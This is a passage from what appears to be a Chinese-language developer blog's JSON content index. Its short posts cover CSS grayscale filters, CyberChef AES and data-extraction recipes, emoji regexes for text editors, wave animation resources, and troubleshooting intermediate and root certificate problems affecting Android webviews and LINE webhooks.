方法","url":"/blog/2020/04/04/%E7%B6%B2%E7%AB%99%E5%93%80%E5%BC%94%E7%81%B0%E9%9A%8E-CSS-%E6%96%B9%E6%B3%95/","content":"<p>單純紀錄</p>\n<a id=\"more\"></a>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">filter</span>: <span class=\"selector-tag\">grayscale</span>(100%);</span><br></pre></td></tr></table></figure>\n<p>html body<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">style</span>=<span class=\"string\">\"filter: grayscale(100%);\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JS Bin<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  test</span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'https://cache.cswsadlab.com/wp-content/uploads/2015/08/16_bg_noise_scale.jpg'</span>) no-repeat center center /cover;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://segmentfault.com/a/1190000007781619\" target=\"_blank\" rel=\"noopener\">哀悼日网站全站变灰CSS代码 - 严颖专栏 - SegmentFault 思否</a></p>\n","categories":["CSS"],"tags":["css"]},{"title":"線上解AES好用工具","url":"/blog/2021/06/02/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/","content":"<p>平常使用API都需要複雜AES加解密轉Base64<br>導致測試API都很麻煩<br>今天找到幾個好用的網站<br>整理一下</p>\n<a id=\"more\"></a>\n<ol>\n<li><a href=\"https://the-x.cn/en-us/cryptography/Aes.aspx\" target=\"_blank\" rel=\"noopener\">AES decryption AES encryption AES Hex Key Supported - The X Online Tools</a></li>\n</ol>\n<ol start=\"2\">\n<li><a href=\"https://gchq.github.io/CyberChef/\" target=\"_blank\" rel=\"noopener\">CyberChef</a></li>\n</ol>\n<p>這個可以客製化很多東西</p>\n<p>AES加解密中文Base64就發現不能顯示出來<br>後來研究出方法</p>\n<p><del>加密中文出來</del>中文沒法加密無法解出中文，但英文不會有問題<br>暫時先用上面的網站來解決<br><a href=\"https://pse.is/3heuwe\" target=\"_blank\" rel=\"noopener\">Encode text, AES Encrypt, To Base64 - CyberChef</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://gchq.github.io/CyberChef/#recipe=Encode_text(&apos;UTF-8%20(65001)&apos;)AES_Encrypt(%7B&apos;option&apos;:&apos;UTF8&apos;,&apos;string&apos;:&apos;20F1aR41efffffff&apos;%7D,%7B&apos;option&apos;:&apos;UTF8&apos;,&apos;string&apos;:&apos;20F1aR41efffffff&apos;%7D,&apos;CBC&apos;,&apos;Raw&apos;,&apos;Raw&apos;,%7B&apos;option&apos;:&apos;Hex&apos;,&apos;string&apos;:&apos;&apos;%7D)To_Base64(&apos;A-Za-z0-9%2B/%3D&apos;)&amp;input=YWJj5Lit5paHYWJj</span><br></pre></td></tr></table></figure></p>\n<p>解中文出來，後面加 decode text UTF-8 就正常了…</p>\n<p><a href=\"https://pse.is/3h5dpr\" target=\"_blank\" rel=\"noopener\">From Base64, AES Decrypt, Decode text - CyberChef</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://gchq.github.io/CyberChef/#recipe=From_Base64(&apos;A-Za-z0-9%2B/%3D&apos;,true)AES_Decrypt(%7B&apos;option&apos;:&apos;UTF8&apos;,&apos;string&apos;:&apos;20F1aR41efffffff&apos;%7D,%7B&apos;option&apos;:&apos;UTF8&apos;,&apos;string&apos;:&apos;20F1aR41efffffff&apos;%7D,&apos;CBC&apos;,&apos;Raw&apos;,&apos;Raw&apos;,%7B&apos;option&apos;:&apos;Hex&apos;,&apos;string&apos;:&apos;&apos;%7D,%7B&apos;option&apos;:&apos;Hex&apos;,&apos;string&apos;:&apos;&apos;%7D)Decode_text(&apos;UTF-8%20(65001)&apos;)&amp;input=QnEvc2xmcFAxSWR1YTFwUXNOV0hHUT09</span><br></pre></td></tr></table></figure>\n<h2 id=\"翻外篇-CyberChef-強大好用的工具\"><a href=\"#翻外篇-CyberChef-強大好用的工具\" class=\"headerlink\" title=\"翻外篇   CyberChef  強大好用的工具\"></a>翻外篇   CyberChef  強大好用的工具</h2><h3 id=\"抓取Email，去除重覆\"><a href=\"#抓取Email，去除重覆\" class=\"headerlink\" title=\"抓取Email，去除重覆\"></a>抓取Email，去除重覆</h3><p><a href=\"https://pse.is/3hn2a2\" target=\"_blank\" rel=\"noopener\">Extract email addresses, Unique - CyberChef</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://gchq.github.io/CyberChef/#recipe=Extract_email_addresses(false)Unique(&apos;Line%20feed&apos;)&amp;input=ZmZmZkBmZmYuY29tCmRkZGRAZmZmLmNvbSwgeHh4eEBmZmZmLmNvbQpmZmZmQGZmZi5jb20KZmZmZkBmZmYuY29t</span><br></pre></td></tr></table></figure>\n<p>維運很常需要做這些東西，我就不需要在 Sublime 抓出 Email 到 Excel 去除重覆</p>\n<h3 id=\"字串包-“-’-符號\"><a href=\"#字串包-“-’-符號\" class=\"headerlink\" title=\"字串包 “,’ 符號\"></a>字串包 “,’ 符號</h3><p><a href=\"https://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(true,false,false,false/disabled)Unique('Line%20feed')Find_/_Replace(%7B'option':'Regex','string':'(.%2B)'%7D,'%5C'$1%5C',',true,false,true,false)Sort('Line%20feed',false,'Alphabetical%20(case%20sensitive)')\" target=\"_blank\" rel=\"noopener\">Extract IP addresses, 3 more - CyberChef</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(true,false,false,false/disabled)Unique(&apos;Line%20feed&apos;)Find_/_Replace(%7B&apos;option&apos;:&apos;Regex&apos;,&apos;string&apos;:&apos;(.%2B)&apos;%7D,&apos;%5C&apos;$1%5C&apos;,&apos;,true,false,true,false)Sort(&apos;Line%20feed&apos;,false,&apos;Alphabetical%20(case%20sensitive)&apos;)</span><br></pre></td></tr></table></figure>\n<p>常常有大量資料查詢，都靠Sublime Text去做，有時候大量資料會當機，但用這個也能做到一樣的效果，還能做去除、排序</p>\n","categories":["實用工具"],"tags":["aes"]},{"title":"編輯器抓取 Emoji 文字方法","url":"/blog/2021/03/08/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/","content":"<p>最進工作維運上要抓 Emoji 文字<br>常常用肉眼去找 表情符號<br>後來發現 TW,JP 也有 Emoji<br>肉眼不一定抓的到<br>所以看一下有沒有 Regex<br>真的可以用…後來發現不是每一個 Editor 都可以用<br>在這邊整理一下</p>\n<a id=\"more\"></a>\n<h1 id=\"編輯器抓取-Emoji\"><a href=\"#編輯器抓取-Emoji\" class=\"headerlink\" title=\"編輯器抓取 Emoji\"></a>編輯器抓取 Emoji</h1><h3 id=\"Sublime-Text\"><a href=\"#Sublime-Text\" class=\"headerlink\" title=\"Sublime Text\"></a>Sublime Text</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[\\x&#123;1f300&#125;-\\x&#123;1f5ff&#125;\\x&#123;1f900&#125;-\\x&#123;1f9ff&#125;\\x&#123;1f600&#125;-\\x&#123;1f64f&#125;\\x&#123;1f680&#125;-\\x&#123;1f6ff&#125;\\x&#123;2600&#125;-\\x&#123;26ff&#125;\\x&#123;2700&#125;-\\x&#123;27bf&#125;\\x&#123;1f1e6&#125;-\\x&#123;1f1ff&#125;\\x&#123;1f191&#125;-\\x&#123;1f251&#125;\\x&#123;1f004&#125;\\x&#123;1f0cf&#125;\\x&#123;1f170&#125;-\\x&#123;1f171&#125;\\x&#123;1f17e&#125;-\\x&#123;1f17f&#125;\\x&#123;1f18e&#125;\\x&#123;3030&#125;\\x&#123;2b50&#125;\\x&#123;2b55&#125;\\x&#123;2934&#125;-\\x&#123;2935&#125;\\x&#123;2b05&#125;-\\x&#123;2b07&#125;\\x&#123;2b1b&#125;-\\x&#123;2b1c&#125;\\x&#123;3297&#125;\\x&#123;3299&#125;\\x&#123;303d&#125;\\x&#123;00a9&#125;\\x&#123;00ae&#125;\\x&#123;2122&#125;\\x&#123;23f3&#125;\\x&#123;24c2&#125;\\x&#123;23e9&#125;-\\x&#123;23ef&#125;\\x&#123;25b6&#125;\\x&#123;23f8&#125;-\\x&#123;23fa&#125;]</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/52266347/grep-for-emojis-in-linux\" target=\"_blank\" rel=\"noopener\">unicode - grep for emojis in linux - Stack Overflow</a></li>\n</ul>\n<h3 id=\"Visual-Studio-Code\"><a href=\"#Visual-Studio-Code\" class=\"headerlink\" title=\"Visual Studio Code\"></a>Visual Studio Code</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[\\u&#123;1f300&#125;-\\u&#123;1f5ff&#125;\\u&#123;1f900&#125;-\\u&#123;1f9ff&#125;\\u&#123;1f600&#125;-\\u&#123;1f64f&#125;\\u&#123;1f680&#125;-\\u&#123;1f6ff&#125;\\u&#123;2600&#125;-\\u&#123;26ff&#125;\\u&#123;2700&#125;-\\u&#123;27bf&#125;\\u&#123;1f1e6&#125;-\\u&#123;1f1ff&#125;\\u&#123;1f191&#125;-\\u&#123;1f251&#125;\\u&#123;1f004&#125;\\u&#123;1f0cf&#125;\\u&#123;1f170&#125;-\\u&#123;1f171&#125;\\u&#123;1f17e&#125;-\\u&#123;1f17f&#125;\\u&#123;1f18e&#125;\\u&#123;3030&#125;\\u&#123;2b50&#125;\\u&#123;2b55&#125;\\u&#123;2934&#125;-\\u&#123;2935&#125;\\u&#123;2b05&#125;-\\u&#123;2b07&#125;\\u&#123;2b1b&#125;-\\u&#123;2b1c&#125;\\u&#123;3297&#125;\\u&#123;3299&#125;\\u&#123;303d&#125;\\u&#123;00a9&#125;\\u&#123;00ae&#125;\\u&#123;2122&#125;\\u&#123;23f3&#125;\\u&#123;24c2&#125;\\u&#123;23e9&#125;-\\u&#123;23ef&#125;\\u&#123;25b6&#125;\\u&#123;23f8&#125;-\\u&#123;23fa&#125;\\u&#123;200d&#125;]</span><br></pre></td></tr></table></figure>\n<h3 id=\"Notepad\"><a href=\"#Notepad\" class=\"headerlink\" title=\"Notepad++\"></a>Notepad++</h3><p>沒有找到方法</p>\n<p>以下是用 workaround 方法<br>處理這個不建議用這個…<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[©️®️‼️⁉️™️ℹ️↔️↕️↖️↗️↘️↙️↩️↪️⌚️⌛️⌨️⏏️⏩️⏪️⏫️⏬️⏭️⏮️⏯️⏰️⏱️⏲️⏳️⏸️⏹️⏺️Ⓜ️▪️▫️▶️◀️◻️◼️◽️◾️☀️☁️☂️☃️☄️☎️☑️☔️☕️☘️☝️☠️☢️☣️☦️☪️☮️☯️☸️☹️☺️♀️♂️♈️♉️♊️♋️♌️♍️♎️♏️♐️♑️♒️♓️♠️♣️♥️♦️♨️♻️♿️⚒️⚓️⚔️⚕️⚖️⚗️⚙️⚛️⚜️⚠️⚡️⚪️⚫️⚰️⚱️⚽️⚾️⛄️⛅️⛈️⛎️⛏️⛑️⛓️⛔️⛩️⛪️⛰️⛱️⛲️⛳️⛴️⛵️⛷️⛸️⛹️⛺️⛽️✂️✅️✈️✉️✊️✋️✌️✍️✏️✒️✔️✖️✝️✡️✨️✳️✴️❄️❇️❌️❎️❓️❔️❕️❗️❣️❤️➕️➖️➗️➡️➰️➿️⤴️⤵️⬅️⬆️⬇️⬛️⬜️⭐️⭕️〰️〽️㊗️㊙️🀄🃏🅰️🅱️🅾️🅿️🆎🆑🆒🆓🆔🆕🆖🆗🆘🆙🆚🈁🈂️🈚🈯🈲🈳🈴🈵🈶🈷️🈸🈹🈺🉐🉑🌀🌁🌂🌃🌄🌅🌆🌇🌈🌉🌊🌋🌌🌍🌎🌏🌐🌑🌒🌓🌔🌕🌖🌗🌘🌙🌚🌛🌜🌝🌞🌟🌠🌡️🌤️🌥️🌦️🌧️🌨️🌩️🌪️🌫️🌬️🌭🌮🌯🌰🌱🌲🌳🌴🌵🌶️🌷🌸🌹🌺🌻🌼🌽🌾🌿🍀🍁🍂🍃🍄🍅🍆🍇🍈🍉🍊🍋🍌🍍🍎🍏🍐🍑🍒🍓🍔🍕🍖🍗🍘🍙🍚🍛🍜🍝🍞🍟🍠🍡🍢🍣🍤🍥🍦🍧🍨🍩🍪🍫🍬🍭🍮🍯🍰🍱🍲🍳🍴🍵🍶🍷🍸🍹🍺🍻🍼🍽️🍾🍿🎀🎁🎂🎃🎄🎅🎆🎇🎈🎉🎊🎋🎌🎍🎎🎏🎐🎑🎒🎓🎖️🎗️🎙️🎚️🎛️🎞️🎟️🎠🎡🎢🎣🎤🎥🎦🎧🎨🎩🎪🎫🎬🎭🎮🎯🎰🎱🎲🎳🎴🎵🎶🎷🎸🎹🎺🎻🎼🎽🎾🎿🏀🏁🏂🏃🏄🏅🏆🏇🏈🏉🏊🏋️🏌️🏍️🏎️🏏🏐🏑🏒🏓🏔️🏕️🏖️🏗️🏘️🏙️🏚️🏛️🏜️🏝️🏞️🏟️🏠🏡🏢🏣🏤🏥🏦🏧🏨🏩🏪🏫🏬🏭🏮🏯🏰🏳️🏴🏵️🏷️🏸🏹🏺🏻🏼🏽🏾🏿🐀🐁🐂🐃🐄🐅🐆🐇🐈🐉🐊🐋🐌🐍🐎🐏🐐🐑🐒🐓🐔🐕🐖🐗🐘🐙🐚🐛🐜🐝🐞🐟🐠🐡🐢🐣🐤🐥🐦🐧🐨🐩🐪🐫🐬🐭🐮🐯🐰🐱🐲🐳🐴🐵🐶🐷🐸🐹🐺🐻🐼🐽🐾🐿️👀👁️👂👃👄👅👆👇👈👉👊👋👌👍👎👏👐👑👒👓👔👕👖👗👘👙👚👛👜👝👞👟👠👡👢👣👤👥👦👧👨👩👪👫👬👭👮👯👰👱👲👳👴👵👶👷👸👹👺👻👼👽👾👿💀💁💂💃💄💅💆💇💈💉💊💋💌💍💎💏💐💑💒💓💔💕💖💗💘💙💚💛💜💝💞💟💠💡💢💣💤💥💦💧💨💩💪💫💬💭💮💯💰💱💲💳💴💵💶💷💸💹💺💻💼💽💾💿📀📁📂📃📄📅📆📇📈📉📊📋📌📍📎📏📐📑📒📓📔📕📖📗📘📙📚📛📜📝📞📟📠📡📢📣📤📥📦📧📨📩📪📫📬📭📮📯📰📱📲📳📴📵📶📷📸📹📺📻📼📽️📿🔀🔁🔂🔃🔄🔅🔆🔇🔈🔉🔊🔋🔌🔍🔎🔏🔐🔑🔒🔓🔔🔕🔖🔗🔘🔙🔚🔛🔜🔝🔞🔟🔠🔡🔢🔣🔤🔥🔦🔧🔨🔩🔪🔫🔬🔭🔮🔯🔰🔱🔲🔳🔴🔵🔶🔷🔸🔹🔺🔻🔼🔽🕉️🕊️🕋🕌🕍🕎🕐🕑🕒🕓🕔🕕🕖🕗🕘🕙🕚🕛🕜🕝🕞🕟🕠🕡🕢🕣🕤🕥🕦🕧🕯️🕰️🕳️🕴️🕵️🕶️🕷️🕸️🕹️🕺🖇️🖊️🖋️🖌️🖍️🖐️🖕🖖🖤🖥️🖨️🖱️🖲️🖼️🗂️🗃️🗄️🗑️🗒️🗓️🗜️🗝️🗞️🗡️🗣️🗨️🗯️🗳️🗺️🗻🗼🗽🗾🗿😀😁😂😃😄😅😆😇😈😉😊😋😌😍😎😏😐😑😒😓😔😕😖😗😘😙😚😛😜😝😞😟😠😡😢😣😤😥😦😧😨😩😪😫😬😭😮😯😰😱😲😳😴😵😶😷😸😹😺😻😼😽😾😿🙀🙁🙂🙃🙄🙅🙆🙇🙈🙉🙊🙋🙌🙍🙎🙏🚀🚁🚂🚃🚄🚅🚆🚇🚈🚉🚊🚋🚌🚍🚎🚏🚐🚑🚒🚓🚔🚕🚖🚗🚘🚙🚚🚛🚜🚝🚞🚟🚠🚡🚢🚣🚤🚥🚦🚧🚨🚩🚪🚫🚬🚭🚮🚯🚰🚱🚲🚳🚴🚵🚶🚷🚸🚹🚺🚻🚼🚽🚾🚿🛀🛁🛂🛃🛄🛅🛋️🛌🛍️🛎️🛏️🛐🛑🛒🛠️🛡️🛢️🛣️🛤️🛥️🛩️🛫🛬🛰️🛳️🛴🛵🛶🛷🛸🤐🤑🤒🤓🤔🤕🤖🤗🤘🤙🤚🤛🤜🤝🤞🤟🤠🤡🤢🤣🤤🤥🤦🤧🤨🤩🤪🤫🤬🤭🤮🤯🤰🤱🤲🤳🤴🤵🤶🤷🤸🤹🤺🤼🤽🤾🥀🥁🥂🥃🥄🥅🥇🥈🥉🥊🥋🥌🥐🥑🥒🥓🥔🥕🥖🥗🥘🥙🥚🥛🥜🥝🥞🥟🥠🥡🥢🥣🥤🥥🥦🥧🥨🥩🥪🥫🦀🦁🦂🦃🦄🦅🦆🦇🦈🦉🦊🦋🦌🦍🦎🦏🦐🦑🦒🦓🦔🦕🦖🦗🧀🧐🧑🧒🧓🧔🧕🧖🧗🧘🧙🧚🧛🧜🧝🧞🧟🧠🧡🧢🧣🧤🧥🧦]</span><br></pre></td></tr></table></figure></p>\n<p>也不能用…</p>\n<p>後來發現是 字串 1232 長度 就可以<br>超過就不能查詢</p>\n","categories":["Linux"]},{"title":"萬用憑證(WildCard)和中間憑證小記","url":"/blog/2018/10/10/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/","content":"<p>最近公司https網站很奇怪，桌面版的Chrome,Firefox顯示正常(安全)<br>但是手機版的Chrome正常，Firefox不正常(非安全)<br>倒置Line App內崁網頁不正常(連結https那台主機沒有正常跳頁)</p>\n<a id=\"more\"></a>\n<p>之前在保哥粉絲團看過<a href=\"https://www.facebook.com/will.fans/videos/1760703873958749/\" target=\"_blank\" rel=\"noopener\">申請 Let’s Encrypt 免費 SSL 憑證一次就上手</a><br>所以對憑證有基本的了解<br>但沒深入了解</p>\n<p>目前有些網站憑證，手機版(Android)Webview會有問題。IOS皆正常<br>但點入登入(網域)LINE會空白頁&amp;Android Firefox會顯是為安全憑證</p>\n<p>正常桌面瀏覽器</p>\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/a.png\" title=\"a網域\">\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/b.png\" title=\"b網域\">\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/android_fierfox.png\" title=\"android_firefox\">\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/line_webview.png\" title=\"line_webview\">\n<p>發現公司不同子網域是用<code>萬用憑證</code><br>簡單來說就是<code>*.xxxx.com.tw</code><br>但問題來了…，為什麼a網段根b網段(都是*.xxxx.com.tw)<br>為什麼a正常、b不正常</p>\n<p>最後爬到這個，<a href=\"https://www.v2ex.com/t/138734\" target=\"_blank\" rel=\"noopener\">DigiCert 的证书，在浏览器（firefox，chrome）上都绿了应该没问题，但是 wget 总是出错 - V2EX</a><br>intermediate certifcate(中間憑證)有問題…<br>瀏覽器會智能判斷，所以不會跳出錯誤<br>經過實驗postman也不會出錯….(可能他是Chrome吧XD)</p>\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/curl_ok.png\" title=\"a網域可以連\">\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/curl_no_ok.png\" title=\"b網域不能連\">\n<p>感覺哪裡怪怪的<br>後來發現<a href=\"https://www.digicert.com/help/\" target=\"_blank\" rel=\"noopener\">SSL Certificate Checker - Diagnostic Tool | DigiCert.com</a>可以測試憑證</p>\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/a_digicert.png\" title=\"a_digicert檢查\">\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/b_digicert.png\" title=\"b_digicert檢查\">\n<img src=\"/blog/2018/10/10/萬用憑證-WildCard-和中間憑證小記/yahoo_digicert.png\" title=\"正常yahoo的\">\n<p><a href=\"https://lv5.in/2016/11/22/%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%86%91%E8%AD%89%E5%A4%A7%E5%B0%8F%E4%BA%8B/\" target=\"_blank\" rel=\"noopener\">你可能不知道的憑證大小事 - 吾輩乃程序猿</a><br><a href=\"https://blog.yorkxin.org/2009/02/23/buying-a-turbo-ssl-cert.html\" target=\"_blank\" rel=\"noopener\">[筆記] SSL 憑證購買記 - Yu-Cheng Chuang’s Blog</a><br>裡面有介紹中繼憑證可能會影像憑證安全性</p>\n<p>跟MIS說是憑證問題，可能要查看看<br>不過MIS說是廠商給他的，所以可能他要問廠商才清楚<br>目前查到這樣了</p>\n<p>其他相關筆記</p>\n<ul>\n<li><a href=\"https://ephrain.net/web-%E6%B3%A8%E6%84%8F-wildcard-%E6%86%91%E8%AD%89%E7%9A%84%E9%81%A9%E7%94%A8%E4%BF%9D%E8%AD%B7%E7%AF%84%E5%9C%8D/\" target=\"_blank\" rel=\"noopener\">[Web] 注意 Wildcard 憑證的適用保護範圍 | EPH 的程式日記</a></li>\n<li><a href=\"https://www.websecurity.symantec.com/zh/tw/blog/what-to-do-if-you-see-warning-messages-in-your-browser\" target=\"_blank\" rel=\"noopener\">如果您的用戶在Chrome與其他瀏覽器中看到警告資訊，那麼您需要做什麼 | DigiCert &amp; Symantec</a></li>\n</ul>\n","categories":["程式心法"],"tags":["tls","ssl","wildcard","憑證"]},{"title":"蒐集一些網頁波浪動態圖示","url":"/blog/2018/09/26/%E8%92%90%E9%9B%86%E4%B8%80%E4%BA%9B%E7%B6%B2%E9%A0%81%E6%B3%A2%E6%B5%AA%E5%8B%95%E6%85%8B%E5%9C%96%E7%A4%BA/","content":"<p>最近想做出一種波浪特效<br>所以有找一些網路上現有的資源</p>\n<a id=\"more\"></a>\n<ul>\n<li><p><a href=\"https://segmentfault.com/a/1190000005182219\" target=\"_blank\" rel=\"noopener\">SVG+JS驱动的波浪动画 - Yoomin的前端学习笔记 - SegmentFault 思否</a><br><a href=\"http://jsbin.com/lobirezuza/edit?html,js,output\" target=\"_blank\" rel=\"noopener\">DEMO</a><br>這個效果不是我要的…<br>裡面有相關貝茲曲線說明<a href=\"https://www.zhangxinxu.com/wordpress/2014/06/deep-understand-svg-path-bezier-curves-command/\" target=\"_blank\" rel=\"noopener\">深度掌握SVG路径path的贝塞尔曲线指令 « 张鑫旭-鑫空间-鑫生活</a></p>\n</li>\n<li><p><a href=\"http://www.sucaihuo.com/js/1927.html\" target=\"_blank\" rel=\"noopener\">canvas圆形进度球html5水波动画特效 - 素材火</a><br>用canvas繪製波浪出來<br>這個波浪很好看<br>但是…Canvas我不熟，其實我不需要外框<br>所以放棄orz</p>\n</li>\n<li><p><a href=\"https://segmentfault.com/a/1190000010627039\" target=\"_blank\" rel=\"noopener\">svg波浪动画 - caoxuejun - SegmentFault 思否</a><br><a href=\"http://jsbin.com/nakotofahi/edit?html,js,output\" target=\"_blank\" rel=\"noopener\">DEMO</a><br>這個適用SVG模擬出來的</p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/coco1s/p/7197662.html\" target=\"_blank\" rel=\"noopener\">纯 CSS 实现波浪效果！ - ChokCoco - 博客园</a><br>介紹一堆波浪方法，但我找不到我要的</p>\n</li>\n</ul>\n<ul>\n<li><a href=\"https://juejin.im/entry/58d86b751b69e6006bbb02fb\" target=\"_blank\" rel=\"noopener\">使用 SVG 轻松实现波浪 (wave) 动画效果 - 前端 - 掘金</a><br><a href=\"https://link.juejin.im/?target=http%3A%2F%2Fcodepen.io%2Fjanily%2Fpen%2FKWBPvx\" target=\"_blank\" rel=\"noopener\">demo地址</a><br>這個原本很棒，但我不能調整…</li>\n</ul>\n<ul>\n<li><a href=\"https://segmentfault.com/q/1010000010980206\" target=\"_blank\" rel=\"noopener\">javascript - 想实现360的波浪进度球效果 - SegmentFault 思否</a><br><a href=\"https://jsfiddle.net/og2b4jwx/\" target=\"_blank\" rel=\"noopener\">DEMO網址</a><br>把wrapper拿掉border-radius之後<br>就是我要的方形  QQ<br>感動</li>\n</ul>\n<p>找的過程，挖到不錯的文</p>\n<ul>\n<li><a href=\"https://github.com/chokcoco/iCSS\" target=\"_blank\" rel=\"noopener\">chokcoco/iCSS: 谈谈一些有趣的 CSS 话题</a></li>\n<li><a href=\"http://www.gcssloop.com/customview/Path_Bezier\" target=\"_blank\" rel=\"noopener\">安卓自定义View进阶-Path之贝塞尔曲线</a></li>\n</ul>\n<p>發現做個特效，數學可能真的很重要orz</p>\n<p>最後採用<a href=\"https://segmentfault.com/q/1010000010980206\" target=\"_blank\" rel=\"noopener\">javascript - 想实现360的波浪进度球效果 - SegmentFault 思否</a><br>放在我現在我做的番茄鐘(暫時)</p>\n<img src=\"/blog/2018/09/26/蒐集一些網頁波浪動態圖示/1.gif\" title=\"放上去特效\">\n<a href=\"/blog/2018/09/26/蒐集一些網頁波浪動態圖示/TheBackground.vue\" title=\"套用在Vue範例檔\">套用在Vue範例檔</a>\n","categories":["網頁特效"],"tags":["css","javascript","波浪"]},{"title":"設備根憑證不正確導致不能打API問題","url":"/blog/2020/07/14/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/","content":"<p>最近要上線的專案會用到 LINE WEBHOOK<br>竟然上正式環境 line 後台 webhook 模擬可以觸發 API<br>但使用行動裝置竟然不可以打…(access.log沒有收到訊息)<br>我們公司有防火牆、Server Load Balancer…<br>查詢上花了不少時間</p>\n<a id=\"more\"></a>\n<p>由於流程很多，我上面就直接講重點</p>\n<h2 id=\"檢查方向\"><a href=\"#檢查方向\" class=\"headerlink\" title=\"檢查方向\"></a>檢查方向</h2><h3 id=\"LINE-文章有提到注意事項\"><a href=\"#LINE-文章有提到注意事項\" class=\"headerlink\" title=\"LINE 文章有提到注意事項\"></a>LINE 文章有提到注意事項</h3><blockquote>\n<p>在設定HTTPS伺服器時，有下列幾點必須注意的事項：</p>\n<ol>\n<li>HTTPS伺服器所使用的根憑證（Root CA）必須是在LINE平台的白名單列表中，否則LINE平台會拒絕傳送訊息。在白名單列表中大多數的憑證都需要付費申請，但是LINE平台也支援常用的免費憑證，例如Let’s Encrypt。</li>\n<li>請勿使用已知具有安全性漏洞的協定（例如SSL v2或SSL v3）或Cipher Suite（例如SWEET32或CVE-2016-2183）。</li>\n<li>請務必正確設定中繼憑證（Intermediate certificate），以避免無法對應到根憑證而發生錯誤。這是最常見的問題通報狀況，請在設定HTTPS伺服器時多加留意。</li>\n</ol>\n</blockquote>\n<p><a href=\"https://engineering.linecorp.com/zh-hant/blog/line-device-10/\" target=\"_blank\" rel=\"noopener\">開發LINE聊天機器人不可不知的十件事 - LINE ENGINEERING</a></p>\n<p>我們公司瀏覽器看網頁沒有跳出安全性問題，Android、Iphone、Linux 也沒有問題<br>所以第一項認為沒問題，但魔鬼出在細節裡<br>文章裡的根憑證白名單列表看不見<br><strong>Google 一下會發現 TWCA 沒有這個憑證，後面再詳細說明</strong><br><a href=\"https://developers.line.biz/media/messaging-api/build-bot/ca_root_v2.txt\" target=\"_blank\" rel=\"noopener\">developers.line.biz/media/messaging-api/build-bot/ca_root_v2.txt</a><br>總之我們前面認為這一段沒有問題</p>\n<p>2,3 憑證都確認都沒有問題</p>\n<p><a href=\"https://www.sslshopper.com/\" target=\"_blank\" rel=\"noopener\">SSL Certificate Comparison and Reviews</a></p>\n<p>這個網站就可以檢查憑證是否有問題</p>\n<h3 id=\"Load-Balance-SNI-設定\"><a href=\"#Load-Balance-SNI-設定\" class=\"headerlink\" title=\"Load Balance SNI 設定\"></a>Load Balance SNI 設定</h3><p>當我們憑證出問題的時候<br>網路同仁有打電話給 Load Balance 廠商詢問設定<br>廠商提到要設定 